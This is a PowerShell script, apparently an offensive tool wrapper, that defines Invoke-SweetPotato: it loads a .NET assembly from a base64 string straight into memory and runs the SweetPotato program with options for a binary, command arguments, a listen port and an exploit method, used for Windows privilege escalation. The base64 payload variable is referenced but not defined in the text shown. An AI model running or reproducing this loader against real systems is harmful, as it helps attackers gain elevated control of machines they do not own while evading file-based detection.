function Invoke-SweetPotato
{
    [CmdletBinding()]
    Param (
        [String]
        $Binary,
		[String]
        $CommandArguments,
		[String]
        $ListenPort,
		[String]
        $ExploitMethod
    )
	$RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

	[Collections.ArrayList]$Arguments = @()
	if($Binary) {
		Write-Output "Running with binary: $Binary"
		$Arguments.Add("-p")
		$Arguments.Add("$Binary")
	}
	if($CommandArguments) {
		Write-Output "Running with command arguments: $CommandArguments"
		$Arguments.Add("-a")
		$Arguments.Add("$CommandArguments")
	}
	if($ListenPort) {
		Write-Output "Running with listen port: $ListenPort"
		$Arguments.Add("-l")
		$Arguments.Add("$ListenPort")
	}
	if($ExploitMethod) {
		Write-Output "Running with exploit method: $ExploitMethod"
		$Arguments.Add("-e")
		$Arguments.Add("$ExploitMethod")
	}

    # Setting a custom stdout to capture Console.WriteLine output
    # https://stackoverflow.com/questions/33111014/redirecting-output-from-an-external-dll-in-powershell
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SweetPotato.Program]::main($Arguments)

     # Restore the regular STDOUT object
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
invoke-sweetpotato